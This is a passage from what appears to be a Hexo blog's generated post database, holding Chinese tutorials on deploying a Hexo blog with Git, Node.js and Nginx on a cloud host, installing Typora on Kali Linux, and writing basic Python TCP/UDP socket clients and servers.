/usr/local/git 目录下\nmake prefix=/usr/local/git install\n</code></pre><h3 id=\"二、配置Git环境变量\"><a href=\"#二、配置Git环境变量\" class=\"headerlink\" title=\"二、配置Git环境变量\"></a>二、配置Git环境变量</h3><ul>\n<li>打开环境变量配置文件进行配置</li>\n</ul>\n<pre><code>vim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile</code></pre><ul>\n<li>验证git安装成功</li>\n</ul>\n<pre><code>git --version</code></pre><h3 id=\"三、云主机与GitHub交换SSH密匙\"><a href=\"#三、云主机与GitHub交换SSH密匙\" class=\"headerlink\" title=\"三、云主机与GitHub交换SSH密匙\"></a>三、云主机与GitHub交换SSH密匙</h3><ul>\n<li>Git初始化</li>\n</ul>\n<pre><code># 设置github昵称\ngit config --global user.name &#39;mxrmiss&#39;\n# 设置github邮箱\ngit config --global user.email &#39;heroli520@outlook.com&#39;</code></pre><ul>\n<li>git status 无法显示中文</li>\n</ul>\n<pre><code>git config --global core.quotepath false</code></pre><ul>\n<li>创建ssh密匙</li>\n</ul>\n<pre><code>ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</code></pre><ul>\n<li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li>\n</ul>\n<pre><code>cat id_rsa.pub</code></pre><p><a href=\"https://imgchr.com/i/syONLT\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s3.ax1x.com/2021/01/18/syONLT.jpg\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"syONLT.jpg\"></a></p>\n<ul>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> 输入此命令，显示successful表示成功</li>\n</ul>\n<h3 id=\"四、node-js安装\"><a href=\"#四、node-js安装\" class=\"headerlink\" title=\"四、node.js安装\"></a>四、node.js安装</h3><ol>\n<li>node.js下载</li>\n</ol>\n<pre><code>cd /opt\nwget https://npm.taobao.org/mirrors/node/v10.16.0/node-v10.16.0-linux-x64.tar.xz  # 下载二进制安装包</code></pre><ol start=\"2\">\n<li>node.js部署</li>\n</ol>\n<pre><code>cd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -&gt; node-v10.16.0-linux-x64</code></pre><ol start=\"3\">\n<li>版本信息</li>\n</ol>\n<pre><code>cd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0</code></pre><ol start=\"4\">\n<li>创建软连接</li>\n</ol>\n<pre><code>ln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v</code></pre><h3 id=\"五、hexo-部署\"><a href=\"#五、hexo-部署\" class=\"headerlink\" title=\"五、hexo 部署\"></a>五、hexo 部署</h3><ol>\n<li>安装hexo</li>\n</ol>\n<pre><code>npm install hexo-cli -g </code></pre><ol start=\"2\">\n<li>采用软连接的方式将hexo添加入全局变量</li>\n</ol>\n<pre><code>ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</code></pre><ol start=\"3\">\n<li>将自己GitHub中存储的hexo博客ssh下载到主机中</li>\n</ol>\n<h3 id=\"六、使用Nginx部署Hexo站点\"><a href=\"#六、使用Nginx部署Hexo站点\" class=\"headerlink\" title=\"六、使用Nginx部署Hexo站点\"></a>六、使用Nginx部署Hexo站点</h3><ol>\n<li>Nginx安装</li>\n</ol>\n<pre><code>yum install -y nginx</code></pre><ol start=\"2\">\n<li>配置Nginx</li>\n</ol>\n<pre><code>nginx -t</code></pre><ol start=\"3\">\n<li>使用vim打开nginx.conf文件</li>\n</ol>\n<ul>\n<li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li>\n</ul>\n<pre><code>vim /etc/nginx/nginx.conf</code></pre><p><a href=\"https://imgchr.com/i/s6S4k8\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s3.ax1x.com/2021/01/18/s6S4k8.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"s6S4k8.png\"></a></p>\n<ol start=\"4\">\n<li>启动Nginx</li>\n</ol>\n<pre><code>systemctl start nginx.service</code></pre><ol start=\"5\">\n<li>重启Nginx</li>\n</ol>\n<pre><code>systemctl restart nginx.service</code></pre><h3 id=\"七、配置本地hexo\"><a href=\"#七、配置本地hexo\" class=\"headerlink\" title=\"七、配置本地hexo\"></a>七、配置本地hexo</h3><ul>\n<li>博客根目录_config下增加</li>\n</ul>\n<pre><code>deploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   </code></pre><ul>\n<li>进入自己的hexo博客目录</li>\n<li>hexo clean</li>\n<li>hexo g</li>\n<li>hexo d</li>\n<li>搜索自己的域名便可访问</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h2 id=\"hexo＋腾讯云主机搭建博客\"><a href=\"#hexo＋腾讯云主机搭建博客\" class=\"headerlink\" title=\"hexo＋腾讯云主机搭建博客\"></a>hexo＋腾讯云主机搭建博客</h2><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/120322118\">参考链接1</a></li>\n<li><a href=\"https://www.jianshu.com/p/31eb5c754c01\">参考链接2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/60578464\">参考链接3</a></li>\n</ul>\n<ul>\n<li>说明：不建议用hexo在云主机上搭建博客，感觉多此一举，建议hexo+github， wordpress+云主机（宝塔界面更快哦）</li>\n</ul>","more":"<h3 id=\"一．Git安装\"><a href=\"#一．Git安装\" class=\"headerlink\" title=\"一．Git安装\"></a>一．Git安装</h3><ul>\n<li>我使用的云主机是centos8系统的，之前也用过ubuntu18系统，但是感觉效果不怎的，可能试的次数比较少吧</li>\n<li>先检查是否有git</li>\n</ul>\n<pre><code>git --version</code></pre><ul>\n<li>没有则安装，旧的卸载重装</li>\n</ul>\n<pre><code>＃卸载旧的git\nyum remove git\n# 安装依赖库\nyum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel\n# 将git下载安装到/usr/local/src目录\ncd /usr/local/src\nwget http://ftp.ntu.edu.tw/software/scm/git/git-2.26.0.tar.gz\ntar -zvxf git-2.26.0.tar.gz\n# 进入目录\ncd git-2.26.0\n# 编译执行\nmake prefix=/usr/local/git all\n# 安装 git 到 /usr/local/git 目录下\nmake prefix=/usr/local/git install\n</code></pre><h3 id=\"二、配置Git环境变量\"><a href=\"#二、配置Git环境变量\" class=\"headerlink\" title=\"二、配置Git环境变量\"></a>二、配置Git环境变量</h3><ul>\n<li>打开环境变量配置文件进行配置</li>\n</ul>\n<pre><code>vim /etc/profile\n\n#添加以下内容\nPATH=$PATH:/usr/local/git/bin   # git 的目录\nexport PATH\n\n# 使配置的环境变量生效\nsource /etc/profile</code></pre><ul>\n<li>验证git安装成功</li>\n</ul>\n<pre><code>git --version</code></pre><h3 id=\"三、云主机与GitHub交换SSH密匙\"><a href=\"#三、云主机与GitHub交换SSH密匙\" class=\"headerlink\" title=\"三、云主机与GitHub交换SSH密匙\"></a>三、云主机与GitHub交换SSH密匙</h3><ul>\n<li>Git初始化</li>\n</ul>\n<pre><code># 设置github昵称\ngit config --global user.name &#39;mxrmiss&#39;\n# 设置github邮箱\ngit config --global user.email &#39;heroli520@outlook.com&#39;</code></pre><ul>\n<li>git status 无法显示中文</li>\n</ul>\n<pre><code>git config --global core.quotepath false</code></pre><ul>\n<li>创建ssh密匙</li>\n</ul>\n<pre><code>ssh-keygen -t rsa -C &quot;GitHub 邮箱&quot;</code></pre><ul>\n<li>输出 id_rsa.pub 内容并复制到GitHub中的setting页面上</li>\n</ul>\n<pre><code>cat id_rsa.pub</code></pre><p><a href=\"https://imgchr.com/i/syONLT\"><img src=\"https://s3.ax1x.com/2021/01/18/syONLT.jpg\" alt=\"syONLT.jpg\"></a></p>\n<ul>\n<li>ssh -T <a href=\"mailto:git@github.com\">git@github.com</a> 输入此命令，显示successful表示成功</li>\n</ul>\n<h3 id=\"四、node-js安装\"><a href=\"#四、node-js安装\" class=\"headerlink\" title=\"四、node.js安装\"></a>四、node.js安装</h3><ol>\n<li>node.js下载</li>\n</ol>\n<pre><code>cd /opt\nwget https://npm.taobao.org/mirrors/node/v10.16.0/node-v10.16.0-linux-x64.tar.xz  # 下载二进制安装包</code></pre><ol start=\"2\">\n<li>node.js部署</li>\n</ol>\n<pre><code>cd /opt\ntar xf node-v10.16.0-linux-x64.tar.xz \nln -s node-v10.16.0-linux-x64 nodejs\nnodejs -&gt; node-v10.16.0-linux-x64</code></pre><ol start=\"3\">\n<li>版本信息</li>\n</ol>\n<pre><code>cd /opt/nodejs/bin\n./node -v\n会看到 v10.16.0</code></pre><ol start=\"4\">\n<li>创建软连接</li>\n</ol>\n<pre><code>ln -s /opt/nodejs/bin/node /usr/local/bin/node\nln -s /opt/nodejs/bin/npm  /usr/local/bin/npm\n\n# 验证\nnode -v</code></pre><h3 id=\"五、hexo-部署\"><a href=\"#五、hexo-部署\" class=\"headerlink\" title=\"五、hexo 部署\"></a>五、hexo 部署</h3><ol>\n<li>安装hexo</li>\n</ol>\n<pre><code>npm install hexo-cli -g </code></pre><ol start=\"2\">\n<li>采用软连接的方式将hexo添加入全局变量</li>\n</ol>\n<pre><code>ln -s /opt/nodejs/lib/node_modules/hexo-cli/bin/hexo /usr/local/bin/hexo</code></pre><ol start=\"3\">\n<li>将自己GitHub中存储的hexo博客ssh下载到主机中</li>\n</ol>\n<h3 id=\"六、使用Nginx部署Hexo站点\"><a href=\"#六、使用Nginx部署Hexo站点\" class=\"headerlink\" title=\"六、使用Nginx部署Hexo站点\"></a>六、使用Nginx部署Hexo站点</h3><ol>\n<li>Nginx安装</li>\n</ol>\n<pre><code>yum install -y nginx</code></pre><ol start=\"2\">\n<li>配置Nginx</li>\n</ol>\n<pre><code>nginx -t</code></pre><ol start=\"3\">\n<li>使用vim打开nginx.conf文件</li>\n</ol>\n<ul>\n<li>注意：有时该配置文件会不同于下面显示的，请参考网上其他教程从官网下载</li>\n</ul>\n<pre><code>vim /etc/nginx/nginx.conf</code></pre><p><a href=\"https://imgchr.com/i/s6S4k8\"><img src=\"https://s3.ax1x.com/2021/01/18/s6S4k8.png\" alt=\"s6S4k8.png\"></a></p>\n<ol start=\"4\">\n<li>启动Nginx</li>\n</ol>\n<pre><code>systemctl start nginx.service</code></pre><ol start=\"5\">\n<li>重启Nginx</li>\n</ol>\n<pre><code>systemctl restart nginx.service</code></pre><h3 id=\"七、配置本地hexo\"><a href=\"#七、配置本地hexo\" class=\"headerlink\" title=\"七、配置本地hexo\"></a>七、配置本地hexo</h3><ul>\n<li>博客根目录_config下增加</li>\n</ul>\n<pre><code>deploy:\n    type: git  (必须是git)\n    repo: root@***(服务器外网ip):#仓库地址\n    branch: master   </code></pre><ul>\n<li>进入自己的hexo博客目录</li>\n<li>hexo clean</li>\n<li>hexo g</li>\n<li>hexo d</li>\n<li>搜索自己的域名便可访问</li>\n</ul>"},{"_content":"---\n\n---\n\n## kali 安装typora\n\n### 一、安装\n\n- 官网下载文件解压，并移动到 /opt 文件夹下\n\n\n\n### 二、赋权\n\n- 在typora目录的bin文件夹下执行命令\n\n```\n./typora\n```\n\n- 会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.\n\n- 执行命令\n\n```\nsudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox\n```\n\n\n\n### 三、添加快捷方式\n\n- vim typora.desktop\n\n```\n[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png\n```\n\n- 将快捷方式复制到/usr/share/applications\n\n```\nsudo cp typora.desktop /usr/share/applications/\n```\n\n- 关机重启","source":"_posts/kali 安装typora.md","raw":"---\n\n---\n\n## kali 安装typora\n\n### 一、安装\n\n- 官网下载文件解压，并移动到 /opt 文件夹下\n\n\n\n### 二、赋权\n\n- 在typora目录的bin文件夹下执行命令\n\n```\n./typora\n```\n\n- 会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.\n\n- 执行命令\n\n```\nsudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox\n```\n\n\n\n### 三、添加快捷方式\n\n- vim typora.desktop\n\n```\n[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png\n```\n\n- 将快捷方式复制到/usr/share/applications\n\n```\nsudo cp typora.desktop /usr/share/applications/\n```\n\n- 关机重启","slug":"kali 安装typora","published":1,"date":"2021-03-24T04:15:02.786Z","updated":"2021-03-24T04:15:02.835Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq3bl428000ldsvtg03k51dy","content":"<hr>\n<hr>\n<h2 id=\"kali-安装typora\"><a href=\"#kali-安装typora\" class=\"headerlink\" title=\"kali 安装typora\"></a>kali 安装typora</h2><h3 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h3><ul>\n<li>官网下载文件解压，并移动到 /opt 文件夹下</li>\n</ul>\n<h3 id=\"二、赋权\"><a href=\"#二、赋权\" class=\"headerlink\" title=\"二、赋权\"></a>二、赋权</h3><ul>\n<li>在typora目录的bin文件夹下执行命令</li>\n</ul>\n<pre><code>./typora</code></pre><ul>\n<li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p>\n</li>\n<li><p>执行命令</p>\n</li>\n</ul>\n<pre><code>sudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox</code></pre><h3 id=\"三、添加快捷方式\"><a href=\"#三、添加快捷方式\" class=\"headerlink\" title=\"三、添加快捷方式\"></a>三、添加快捷方式</h3><ul>\n<li>vim typora.desktop</li>\n</ul>\n<pre><code>[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</code></pre><ul>\n<li>将快捷方式复制到/usr/share/applications</li>\n</ul>\n<pre><code>sudo cp typora.desktop /usr/share/applications/</code></pre><ul>\n<li>关机重启</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<hr>\n<hr>\n<h2 id=\"kali-安装typora\"><a href=\"#kali-安装typora\" class=\"headerlink\" title=\"kali 安装typora\"></a>kali 安装typora</h2><h3 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h3><ul>\n<li>官网下载文件解压，并移动到 /opt 文件夹下</li>\n</ul>\n<h3 id=\"二、赋权\"><a href=\"#二、赋权\" class=\"headerlink\" title=\"二、赋权\"></a>二、赋权</h3><ul>\n<li>在typora目录的bin文件夹下执行命令</li>\n</ul>\n<pre><code>./typora</code></pre><ul>\n<li><p>会报错[7442:0707/173355.682906:FATAL:setuid_sandbox_host.cc(157)] The SUID sandbox helper binary was found, but is not configured correctly. Rather than run without sandboxing I’m aborting now. You need to make sure that /opt/Typora-linux-x64/chrome-sandbox is owned by root and has mode 4755.</p>\n</li>\n<li><p>执行命令</p>\n</li>\n</ul>\n<pre><code>sudo chown root chrome-sandbox\nsudo chgrp root chrome-sandbox\nsudo chmod 4755 chrome-sandbox</code></pre><h3 id=\"三、添加快捷方式\"><a href=\"#三、添加快捷方式\" class=\"headerlink\" title=\"三、添加快捷方式\"></a>三、添加快捷方式</h3><ul>\n<li>vim typora.desktop</li>\n</ul>\n<pre><code>[Desktop Entry]\nName=Typora\nExec=/opt/Typora-linux-x64/Typora\nType=Application\nIcon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_512x512.png</code></pre><ul>\n<li>将快捷方式复制到/usr/share/applications</li>\n</ul>\n<pre><code>sudo cp typora.desktop /usr/share/applications/</code></pre><ul>\n<li>关机重启</li>\n</ul>\n"},{"title":"网络编程","date":"2020-10-15T16:00:00.000Z","comments":1,"_content":"\n\n\n# python网络编程\n\n### 一、客户端\n\n#### TCP客户端\n\n<!--more-->\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(\"hello, world!\")\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()\n```\n\n#### UDP客户端\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(\"hello, world!\", (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()\n```\n\n### 二、服务器\n\n```python\nimport socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = \"\"  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint('[*] Listening on {}:{}' .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print('[*] Received: {}' .format(request))\n    send_it = \"I love you\"\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(\"[*] Accepted connection from: {}:{}\" .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()\n```\n\n### 实战演练\n\n#### 服务器（采取多线程）\n\n```python\nimport socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack('QQ', 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack('QQ', 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        '''\n        在这里插入对Ctrl+C的控制\n        '''\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print('正在接收客户端信息...\\n')\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print('显示客户端信息：{}'.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(\"Client has disconnected\")\n                    break\n            except:\n                client.close()\n\n\nif __name__ == '__main__':\n    server = ThreadSocket('', 9000)\n    server.listen()\n\n```\n\n\n\n#### 客户端\n\n```python\nimport socket\n\ntarget_host = '127.0.0.1'\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input('输入你想说的：')\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + 'love')\n```\n\n\n\n### 三、[socket常见选项之SO_REUSEADDR,SO_REUSEPORT](https://www.cnblogs.com/HKUI/p/11707170.html)\n\n- 使端口被释放后可以立即被使用","source":"_posts/python网络编程.md","raw":"---\ntitle: 网络编程\ndate: 2020/10/16 \ncomments: ture\ncategories:\n- python\ntags:\n- 网络编程\n---\n\n\n\n# python网络编程\n\n### 一、客户端\n\n#### TCP客户端\n\n<!--more-->\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(\"hello, world!\")\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()\n```\n\n#### UDP客户端\n\n```python\nimport socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(\"hello, world!\", (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()\n```\n\n### 二、服务器\n\n```python\nimport socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = \"\"  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint('[*] Listening on {}:{}' .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print('[*] Received: {}' .format(request))\n    send_it = \"I love you\"\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(\"[*] Accepted connection from: {}:{}\" .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()\n```\n\n### 实战演练\n\n#### 服务器（采取多线程）\n\n```python\nimport socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack('QQ', 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack('QQ', 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        '''\n        在这里插入对Ctrl+C的控制\n        '''\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print('正在接收客户端信息...\\n')\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print('显示客户端信息：{}'.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(\"Client has disconnected\")\n                    break\n            except:\n                client.close()\n\n\nif __name__ == '__main__':\n    server = ThreadSocket('', 9000)\n    server.listen()\n\n```\n\n\n\n#### 客户端\n\n```python\nimport socket\n\ntarget_host = '127.0.0.1'\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input('输入你想说的：')\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + 'love')\n```\n\n\n\n### 三、[socket常见选项之SO_REUSEADDR,SO_REUSEPORT](https://www.cnblogs.com/HKUI/p/11707170.html)\n\n- 使端口被释放后可以立即被使用","slug":"python网络编程","published":1,"updated":"2021-03-24T04:15:02.546Z","layout":"post","photos":[],"link":"","_id":"ckq3bl42h000pdsvt0fozbxy7","content":"<h1 id=\"python网络编程\"><a href=\"#python网络编程\" class=\"headerlink\" title=\"python网络编程\"></a>python网络编程</h1><h3 id=\"一、客户端\"><a href=\"#一、客户端\" class=\"headerlink\" title=\"一、客户端\"></a>一、客户端</h3><h4 id=\"TCP客户端\"><a href=\"#TCP客户端\" class=\"headerlink\" title=\"TCP客户端\"></a>TCP客户端</h4><span id=\"more\"></span>\n\n<pre><code class=\"python\">import socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.send(&quot;hello, world!&quot;)\n\n# 接受数据\n# 最大接受1024字节数据\nresponse = client.recv(1024)\n\nprint(response)\n\n# 关闭套接字\nclient.close()</code></pre>\n<h4 id=\"UDP客户端\"><a href=\"#UDP客户端\" class=\"headerlink\" title=\"UDP客户端\"></a>UDP客户端</h4><pre><code class=\"python\">import socket\n\n# 建立变量：目标主机和目标端口\nhost = ***\nport = ***\n\n# 建立一个socket对象\nclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# 连接客户端\n# connect内的是一个元组，代表的是一个具体的地址\nclient.connect((host, port))\n\n# 发送数据\nclient.sendto(&quot;hello, world!&quot;, (host, port))\n\n# 接收数据\n# 最大接受1024字节数据\ndata, addr = client.recvfrom(1024)\n\nprint(data)\n\n# 关闭套接字\nclient.close()</code></pre>\n<h3 id=\"二、服务器\"><a href=\"#二、服务器\" class=\"headerlink\" title=\"二、服务器\"></a>二、服务器</h3><pre><code class=\"python\">import socket\nimport threading\n\n\n# bind_id留空的意思是本地IP 127.0.0.1\nbind_id = &quot;&quot;  \nbind_port = 9999\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind((bind_id, bind_port))\nserver.listen(5)\nprint(&#39;[*] Listening on &#123;&#125;:&#123;&#125;&#39; .format(bind_id, bind_port))\n\ndef handle_client(client_socket):\n    request = client_socket.recv(1024)\n    print(&#39;[*] Received: &#123;&#125;&#39; .format(request))\n    send_it = &quot;I love you&quot;\n    client_socket.send(send_it.encode())\n    client_socket.close()\n\n\nclient, address = server.accept()\nprint(&quot;[*] Accepted connection from: &#123;&#125;:&#123;&#125;&quot; .format(client, address))\nclient_handler_t1 = threading.Thread(target=handle_client, args=(client, ))\nclient_handler_t1.start()</code></pre>\n<h3 id=\"实战演练\"><a href=\"#实战演练\" class=\"headerlink\" title=\"实战演练\"></a>实战演练</h3><h4 id=\"服务器（采取多线程）\"><a href=\"#服务器（采取多线程）\" class=\"headerlink\" title=\"服务器（采取多线程）\"></a>服务器（采取多线程）</h4><pre><code class=\"python\">import socket\nimport threading\n# from struct import pack\n\n\nclass ThreadSocket(object):\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        self.sock.bind((self.host, self.port))\n        # 超时收取，超过5秒没收到客户端回应自动断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#39;QQ&#39;, 5, 0))\n        # 超时发送，超过5秒没将数据传送至客户端断开连接\n        # self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#39;QQ&#39;, 4, 0))\n\n    def listen(self):\n        self.sock.listen(5)\n        &#39;&#39;&#39;\n        在这里插入对Ctrl+C的控制\n        &#39;&#39;&#39;\n        # 循环连接，可以与多个客户端依次链接\n        # while True:\n        client, address = self.sock.accept()\n        print(&#39;正在接收客户端信息...\\n&#39;)\n        # 超过30秒停止活动\n        # client.settimeout(15)\n        t1 = threading.Thread(target=self.handleClientRequest, args=(\n            client, address))\n        t1.start()\n\n    def handleClientRequest(self, client, address):\n        # 采取循环，使每次与客户端连接都可以进行多次对话\n        while True:\n            try:\n                data = client.recv(1024)\n                print(&#39;显示客户端信息：&#123;&#125;&#39;.format(data))\n                if data:\n                    client.send(data)\n                else:\n                    print(&quot;Client has disconnected&quot;)\n                    break\n            except:\n                client.close()\n\n\nif __name__ == &#39;__main__&#39;:\n    server = ThreadSocket(&#39;&#39;, 9000)\n    server.listen()\n</code></pre>\n<h4 id=\"客户端\"><a href=\"#客户端\" class=\"headerlink\" title=\"客户端\"></a>客户端</h4><pre><code class=\"python\">import socket\n\ntarget_host = &#39;127.0.0.1&#39;\ntarget_ip = 9000\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect((target_host, target_ip))\nsend_data = input(&#39;输入你想说的：&#39;)\nclient.send(send_data.encode())\nresponse = client.recv(4096)\n\nprint(response.decode() + &#39;love&#39;)</code></pre>\n<h3 id=\"三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\"><a href=\"#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT\" 